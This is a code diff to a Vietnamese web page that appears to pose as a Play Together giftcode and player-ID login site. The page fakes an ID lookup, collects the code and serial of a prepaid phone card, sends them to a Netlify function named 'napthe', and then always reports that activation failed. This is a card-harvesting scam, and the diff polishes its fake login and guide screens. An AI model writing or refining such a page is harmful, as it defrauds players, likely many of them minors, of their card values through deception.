@@ -33,14 +33,13 @@
         .btn-main-receive { background: var(--red); color: white; border: none; padding: 8px 20px; border-radius: 8px; font-weight: 800; cursor: pointer; margin-top: 8px; font-size: 13px; align-self: center; margin-bottom: 10px; }
         .btn-disabled { background: var(--gray) !important; cursor: not-allowed !important; opacity: 0.7; }
 
-        /* Nút Messenger Messenger Widget */
+        /* Messenger Widget */
         .messenger-btn {
             position: fixed; bottom: 20px; right: 15px; z-index: 9999;
             background: #fff; padding: 8px 15px 8px 8px; border-radius: 50px;
             display: flex; align-items: center; gap: 10px; text-decoration: none; color: #333;
             box-shadow: 0 4px 15px rgba(0,0,0,0.15); border: 1px solid #f0f0f0; transition: 0.2s;
         }
-        .messenger-btn:active { transform: scale(0.95); }
         .messenger-btn img.avatar { width: 38px; height: 38px; border-radius: 50%; object-fit: cover; }
         .messenger-text { display: flex; flex-direction: column; }
         .messenger-name { font-size: 13px; font-weight: 800; display: flex; align-items: center; gap: 4px; }
@@ -69,6 +68,10 @@
         label { display: block; text-align: left; font-size: 11px; font-weight: 700; color: #718096; margin-bottom: 5px; text-transform: uppercase; }
         .id-error { color: #e74c3c; font-size: 11px; text-align: left; margin-top: -8px; margin-bottom: 10px; display: none; font-weight: 600; }
 
+        /* Thêm style cho nút cam theo ảnh mẫu */
+        .btn-login-orange { background: #f39c12; color: white; border: none; padding: 14px; width: 100%; border-radius: 12px; font-weight: 800; cursor: pointer; font-size: 16px; box-shadow: 0 4px 0 #d38312; }
+        .btn-login-orange:active { transform: translateY(2px); box-shadow: 0 2px 0 #d38312; }
+
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--blue); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
@@ -85,14 +88,7 @@
 <div class="latest-codes">
     <h4>Danh sách Code mới nhất:</h4>
     <div class="code-list">
-        <span class="code-item">PTIGBYEWINTER</span>
-        <span class="code-item">LOCTETPTG2026</span>
-        <span class="code-item">HUNGLOC26</span>
-        <span class="code-item">LOCLAPT</span>
-        <span class="code-item">PTMYVALENTINE</span>
-        <span class="code-item">PTFORTUNETABLE</span>
-        <span class="code-item">LEGENDDERBYPT</span>
-        <span class="code-item">FLOWERFAIRYPT</span>
+        <span class="code-item">PTIGBYEWINTER</span><span class="code-item">LOCTETPTG2026</span><span class="code-item">HUNGLOC26</span><span class="code-item">LOCLAPT</span><span class="code-item">PTMYVALENTINE</span><span class="code-item">PTFORTUNETABLE</span><span class="code-item">LEGENDDERBYPT</span><span class="code-item">FLOWERFAIRYPT</span>
     </div>
 </div>
 
@@ -104,9 +100,7 @@
         <span class="messenger-name">Play Together</span>
         <span class="messenger-sub">Bắt đầu cuộc trò chuyện</span>
     </div>
-    <div class="messenger-icon-circle">
-        <svg viewBox="0 0 24 24"><path d="M12 2.04C6.5 2.04 2 6.18 2 11.28c0 2.89 1.44 5.47 3.69 7.15.19.14.3.36.3.6v2.33c0 .54.54.91 1.01.67l2.61-1.33c.15-.08.33-.11.5-.08.62.11 1.25.17 1.89.17 5.5 0 10-4.14 10-9.24s-4.5-9.24-10-9.24zm.8 12.33l-2-2.12-3.89 2.12 4.28-4.55 2.05 2.12 3.84-2.12-4.28 4.55z"/></svg>
-    </div>
+    <div class="messenger-icon-circle"><svg viewBox="0 0 24 24"><path d="M12 2.04C6.5 2.04 2 6.18 2 11.28c0 2.89 1.44 5.47 3.69 7.15.19.14.3.36.3.6v2.33c0 .54.54.91 1.01.67l2.61-1.33c.15-.08.33-.11.5-.08.62.11 1.25.17 1.89.17 5.5 0 10-4.14 10-9.24s-4.5-9.24-10-9.24zm.8 12.33l-2-2.12-3.89 2.12 4.28-4.55 2.05 2.12 3.84-2.12-4.28 4.55z"/></svg></div>
 </a>
 
 <div class="modal" id="app-modal">
@@ -161,16 +155,33 @@
         content.innerHTML = `<img src="${img}" class="zoom-img"><div class="zoom-title">${name}</div>${btn}`;
     }
 
+    // --- CHỈ SỬA PHẦN NÀY ĐỂ THÊM HƯỚNG DẪN ID ---
     function openIDInput() {
         content.innerHTML = `
-            <h3 style="margin-bottom:20px">XÁC THỰC NGƯỜI CHƠI</h3>
-            <label>Player ID (Định dạng: XXXX-XXXX-XXXX)</label>
-            <input type="text" id="p-id-input" placeholder="Ví dụ: NJEB-Z29L-LMYC" maxlength="14" oninput="formatID(this)">
-            <div id="id-error-msg" class="id-error">ID không hợp lệ (Dạng: NJEB-Z29L-LMYC)</div>
-            <button class="btn-popup-receive" style="background:var(--blue)" onclick="processID()">ĐĂNG NHẬP</button>`;
+            <div style="display:flex; align-items:center; justify-content:center; gap:8px; margin-bottom:20px">
+                <span style="background:var(--red); color:white; width:24px; height:24px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:800; font-size:14px">1</span>
+                <h3 style="font-size:18px">Vui lòng Đăng Nhập ID</h3>
+            </div>
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px">
+                <label style="margin-bottom:0; font-size:15px; color:#444">Player ID</label>
+                <span style="color:var(--blue); font-size:12px; text-decoration:underline; font-weight:700; cursor:pointer" onclick="openHuongDan()">Hướng dẫn lấy ID</span>
+            </div>
+            <input type="text" id="p-id-input" placeholder="Nhập UID từ 12–14 ký tự" maxlength="14" oninput="formatID(this)">
+            <div id="id-error-msg" class="id-error">ID không hợp lệ (Dạng: XXXX-XXXX-XXXX)</div>
+            <p style="font-size:11px; color:#888; text-align:left; margin-top:-5px; margin-bottom:15px">Bạn có thể dán nhanh bằng Ctrl+V. .</p>
+            <button class="btn-login-orange" onclick="processID()">Đăng Nhập</button>`;
     }
 
-    // Tự động thêm dấu gạch và viết hoa khi nhập
+    function openHuongDan() {
+        content.innerHTML = `
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px">
+                <h3 style="font-size:16px">Hướng dẫn tìm ID</h3>
+                <span style="cursor:pointer; font-weight:800" onclick="openIDInput()">✕</span>
+            </div>
+            <img src="https://i.postimg.cc/bw6Zzw64/IMG-2125.png" style="width:100%; border-radius:12px">
+            <button class="btn-login-orange" style="margin-top:15px" onclick="openIDInput()">Đóng</button>`;
+    }
+
     function formatID(el) {
         let val = el.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
         let formatted = "";
@@ -185,12 +196,10 @@
     function processID() {
         const val = document.getElementById('p-id-input').value;
         const regex = /^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$/; 
-        
         if(!regex.test(val)) {
             document.getElementById('id-error-msg').style.display = 'block';
             return;
         }
-
         userPlayerID = val;
         content.innerHTML = `<div style="padding:30px 0"><div class="loader"></div><p style="font-weight:800">Đang tìm kiếm ID: ${userPlayerID}...</p></div>`;
         setTimeout(() => { showCodeBoard(); }, 3000); 
@@ -216,7 +225,7 @@
             <button class="btn-popup-receive" onclick="finalLoading()">XÁC NHẬN THẺ</button>`;
     }
 
-    // LOGIC KẾT NỐI ĐỔI THẺ 1S (NETLIFY FUNCTION)
+    // LOGIC GỐC CỦA BẠN (S1 LIÊN KẾT NETLIFY)
     async function finalLoading() {
         let code = document.getElementById('c-code').value;
         let seri = document.getElementById('c-seri').value;
@@ -226,7 +235,6 @@
         content.innerHTML = `<div style="padding:30px 0"><div class="loader"></div><p style="font-weight:800">Đang kiểm tra thẻ trên hệ thống...</p></div>`;
         
         try {
-            // Gửi dữ liệu về Netlify function của bạn
             await fetch('/.netlify/functions/napthe', { 
                 method: 'POST', 
                 headers: { 'Content-Type': 'application/json' }, 
@@ -234,7 +242,7 @@
             });
             
             setTimeout(() => {
-                content.innerHTML = `<div style="font-size:50px; margin-bottom:10px">❌</div><h3 style="color:#ff4d4d">KÍCH HOẠT THẤT BẠI</h3><p>Thẻ có mã <b>${code}</b> không hợp lệ hoặc sai mệnh giá. Vui lòng thử lại!</p><button class="btn-popup-receive" style="background:#ff4d4d" onclick="openPay()">ĐÓNG</button>`;
+                content.innerHTML = `<div style="font-size:50px; margin-bottom:10px">❌</div><h3 style="color:#ff4d4d">KÍCH HOẠT THẤT BẠI</h3><p>Thẻ nạp không hợp lệ hoặc sai mệnh giá. Vui lòng thử lại!</p><button class="btn-popup-receive" style="background:#ff4d4d" onclick="openPay()">ĐÓNG</button>`;
             }, 3000);
         } catch (err) { 
             alert("Lỗi kết nối máy chủ nạp thẻ!"); 
